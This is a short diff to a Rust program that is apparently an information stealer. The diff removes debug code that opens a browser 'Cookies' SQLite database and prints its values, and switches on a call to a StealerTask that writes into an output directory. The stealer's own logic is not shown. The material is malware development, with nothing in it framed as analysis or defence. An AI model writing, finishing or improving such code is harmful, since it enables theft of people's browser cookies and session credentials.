@@ -13,12 +13,10 @@
 
 #![allow(unsafe_op_in_unsafe_fn)]
 
-use sqlite::{DatabaseReader, TableRecordExtension};
 extern crate alloc;
 
 use stealer::StealerTask;
 use tasks::Task;
-use utils::log_debug;
 use utils::path::Path;
 
 mod panic;
@@ -33,17 +31,8 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     let _ = out.remove_dir_all();
     let _ = out.mkdir();
     
-    // unsafe {
-    //     StealerTask::new().run(&out);
-    // }
-
-    let path = Path::new("target") / "Cookies";
-    let bytes = path.read_file().unwrap();
-    let db = sqlite::read_sqlite3_database_by_bytes(&bytes).unwrap();
-    let iter = db.read_table("Cookies").unwrap();
-
-    for row in iter {
-        log_debug!("{}\n", row.get_value(1).unwrap());
+    unsafe {
+        StealerTask::new().run(&out);
     }
 
     0
